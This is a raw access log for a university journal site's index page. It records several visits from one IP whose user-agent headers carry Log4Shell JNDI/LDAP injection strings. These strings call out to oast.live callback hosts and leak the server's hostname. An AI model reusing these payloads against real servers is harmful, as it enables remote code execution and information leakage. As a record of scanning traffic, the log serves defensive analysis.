47.237.51.23 - - "2025-10-25 04:52:24" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2505.0 Safari/537.36"
154.90.61.80 - - "2025-10-25 05:17:11" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko, Foregenix) Chrome/91.0.4472.77 Safari/537.36"
154.90.61.80 - - "2025-10-25 05:20:30" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1"
154.90.61.80 - - "2025-10-25 05:27:25" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0 SeaMonkey/2.46"
154.90.61.80 bot - "2025-10-25 05:49:59" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Bloglines/3.1 (http://www.bloglines.com)"
46.4.94.14 - - "2025-10-25 05:58:01" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
46.4.94.14 - - "2025-10-25 05:58:02" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
154.90.61.80 - - "2025-10-25 12:48:18" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36"
154.90.61.80 - - "2025-10-25 12:48:18" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "${jndi:ldap://${:-481}${:-352}.${hostName}.useragent.d3ucaash7ttjf5aej92g7c9fmzua1jn16.oast.live}"
154.90.61.80 - - "2025-10-25 12:48:22" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "${jndi:ldap://127.0.0.1#.${hostName}.useragent.d3ucaash7ttjf5aej92gxowcq3qzijhx1.oast.live}"
154.90.61.80 - - "2025-10-25 12:48:27" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
154.90.61.80 - - "2025-10-25 12:48:41" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36"
154.90.61.80 - - "2025-10-25 12:50:08" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36"
154.90.61.80 - - "2025-10-25 13:50:42" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36"
154.90.61.80 - - "2025-10-25 13:50:43" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "${jndi:ldap://${:-481}${:-352}.${hostName}.useragent.d3ucaash7ttjf5aej92g1aj38nyatxpz8.oast.live}"
154.90.61.80 - - "2025-10-25 13:50:46" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "${jndi:ldap://127.0.0.1#.${hostName}.useragent.d3ucaash7ttjf5aej92gfkb17k1yk4mkx.oast.live}"
154.90.61.80 - - "2025-10-25 13:50:50" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
154.90.61.80 - - "2025-10-25 13:51:00" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36"
154.90.61.80 - - "2025-10-25 13:52:45" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36"
18.141.225.240 - - "2025-10-25 16:39:30" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
43.173.173.61 - - "2025-10-25 20:34:36" https://journals.cbsua.edu.ph/index.php/Journals/index 200 "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.114 Safari/537.36"
